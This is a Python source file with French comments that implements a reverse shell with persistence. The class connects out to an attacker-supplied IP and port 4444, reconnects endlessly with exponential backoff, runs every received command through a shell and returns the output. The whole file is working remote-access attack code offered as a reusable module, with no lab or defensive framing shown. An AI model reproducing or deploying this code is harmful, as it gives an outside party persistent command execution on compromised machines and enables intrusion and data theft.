"""
Persistence Module
Mécanismes de persistance pour la reverse shell
"""

import socket
import time
import subprocess
from typing import Optional


class ReverseShellAvecPersistance:
    """
    Reverse Shell avec persistance basique
    Reconnecter automatiquement si la connexion est perdue
    """

    def __init__(self, attaquant_ip: str, attaquant_port: int = 4444,
                 intervalle_reconnexion: int = 5):
        """
        Args:
            attaquant_ip: IP du handler
            attaquant_port: Port du handler
            intervalle_reconnexion: Attendre X secondes avant de reconnecter
        """
        self.attaquant_ip = attaquant_ip
        self.attaquant_port = attaquant_port
        self.intervalle_reconnexion = intervalle_reconnexion
        self.socket: Optional[socket.socket] = None

    def connecter_avec_persistance(self) -> bool:
        """
        Connecter avec retry automatique

        Tentatives infinies avec backoff exponentiel
        """
        tentative = 0
        delai_base = 1  # 1 seconde initiale

        while True:
            tentative += 1

            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.attaquant_ip, self.attaquant_port))

                print(f"[PERSISTANCE] Connecté après {tentative} tentative(s)")
                return True

            except Exception as e:
                # Calculer délai avec backoff exponentiel (max 60s)
                delai = min(delai_base * (2 ** (tentative - 1)), 60)

                print(f"[PERSISTANCE] Connexion échouée tentative {tentative}")
                print(f"[PERSISTANCE] Prochaine tentative dans {delai}s...")

                time.sleep(delai)

    def boucle_reception(self):
        """
        Boucle de réception avec reconnexion automatique
        """
        while True:
            # Connecter si nécessaire
            if not self.socket:
                if not self.connecter_avec_persistance():
                    continue

            try:
                # Recevoir commande
                donnees = self.socket.recv(1024)

                if not donnees:
                    print("[PERSISTANCE] Déconnexion, tentative de reconnexion...")
                    self.socket = None
                    continue

                # Exécuter commande
                commande = donnees.decode('utf-8').strip()

                if commande:
                    resultats = self._executer_commande(commande)
                else:
                    resultats = ""

                # Envoyer résultats
                self.socket.send(resultats.encode('utf-8'))

            except Exception as e:
                print(f"[PERSISTANCE] Erreur: {e}")
                self.socket = None
                time.sleep(self.intervalle_reconnexion)

    def _executer_commande(self, commande: str) -> str:
        """Exécuter commande"""
        try:
            process = subprocess.Popen(
                commande,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            try:
                stdout, _ = process.communicate(timeout=30)
                return stdout
            except subprocess.TimeoutExpired:
                process.kill()
                return "[TIMEOUT]\n"

        except Exception as e:
            return f"[ERREUR] {str(e)}\n"
